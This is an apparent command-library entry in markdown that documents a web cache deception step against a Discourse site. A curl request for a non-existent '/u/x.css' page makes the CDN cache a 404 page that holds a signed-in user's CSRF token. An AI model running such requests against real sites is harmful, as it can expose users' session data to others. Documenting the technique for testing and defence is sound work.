---
data: 'curl -H "Host: try.discourse.org" "https://try.discourse.org/u/x.css"'
tags:
  - recon
  - http
type: command
output: >-
  <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" /> and
  CF-Cache-Status: HIT on second request
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.436Z'
id: c2ec5629-ae60-4d86-b7f9-77ebf29e4a62
verified: false
validated: true
submitted: true
---
# curl-get-u-x-css

## Command

```bash
curl -H "Host: try.discourse.org" "https://try.discourse.org/u/x.css"
```

## Description

Requests a non-existent user page with .css extension to trigger caching of the 404 page containing CSRF token. Use while signed in to populate with user-specific data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H "Host: try.discourse.org" | Specifies the target host | Yes |
| https://try.discourse.org/u/x.css | Path to non-existent user with .css | Yes |

## Examples

### Basic Usage

```bash
curl -H "Host: try.discourse.org" "https://try.discourse.org/u/x.css"
```

### Advanced Usage

```bash
curl -v -H "Host: try.discourse.org" "https://try.discourse.org/u/x.css" > response.html
```

## Expected Output

HTML with <meta name="csrf-token" content="..."> and headers; second identical request shows CF-Cache-Status: HIT.

## Related

- [[commands/curl-get-u-my-preferences-css]]
